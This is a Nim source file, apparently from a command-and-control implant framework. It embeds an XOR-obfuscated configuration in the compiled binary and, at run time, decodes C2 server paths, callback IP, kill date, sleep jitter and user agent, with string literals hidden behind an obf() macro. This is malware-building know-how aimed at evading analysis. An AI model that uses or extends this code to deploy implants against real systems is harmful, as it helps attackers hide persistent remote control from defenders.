import parsetoml, strutils, tables
from ../util/crypto import xorStringToByteSeq, xorByteSeqToString
import ../util/strenc
# Parse the configuration file
# This constant will be stored in the binary itself (hence the XOR)
proc parseConfig*() : Table[string, string] =
    var config = initTable[string, string]()

    # Allow us to re-write the static XOR key used for pre-crypto operations
    # This is handled by the Python wrapper at compile time, the default value shouldn't be used
    const INITIAL_XOR_KEY {.intdefine.}: int = 459457925
    
    # Workspace identifier for this implant
    const workspace_uuid {.strdefine.}: string = ""

    # Embed the configuration as a XORed sequence of bytes at COMPILE-time
    const embeddedConf = xorStringToByteSeq(staticRead(obf("../../config.toml")), INITIAL_XOR_KEY)
    
    # Decode the configuration at RUNtime and parse the TOML to store it in a basic table
    var tomlConfig = parsetoml.parseString(xorByteSeqToString(embeddedConf, INITIAL_XOR_KEY))
    config[obf("hostname")]         = tomlConfig[obf("implants_server")][obf("hostname")].getStr()
    config[obf("listenerType")]     = tomlConfig[obf("implants_server")][obf("type")].getStr()
    config[obf("listenerPort")]     = $tomlConfig[obf("implants_server")][obf("port")].getInt()
    config[obf("listenerRegPath")]  = tomlConfig[obf("implants_server")][obf("registerPath")].getStr()
    config[obf("listenerTaskPath")] = tomlConfig[obf("implants_server")][obf("taskPath")].getStr()
    config[obf("listenerResPath")]  = tomlConfig[obf("implants_server")][obf("resultPath")].getStr()
    config[obf("reconnectPath")]    = tomlConfig[obf("implants_server")][obf("reconnectPath")].getStr()
    config[obf("implantCallbackIp")]       = tomlConfig[obf("implant")][obf("implantCallbackIp")].getStr()
    config[obf("killDate")]         = $tomlConfig[obf("implant")][obf("killDate")].getStr()
    config[obf("sleepTime")]        = $tomlConfig[obf("implant")][obf("sleepTime")].getInt()
    config[obf("sleepJitter")]      = $tomlConfig[obf("implant")][obf("sleepJitter")].getInt()
    config[obf("userAgent")]        = tomlConfig[obf("implant")][obf("userAgent")].getStr()
    config[obf("httpAllowCommunicationKey")] = tomlConfig[obf("implant")][obf("httpAllowCommunicationKey")].getStr()
    
    # Add workspace information if defined
    if workspace_uuid != "":
        config[obf("workspace_uuid")] = workspace_uuid
    
    return config     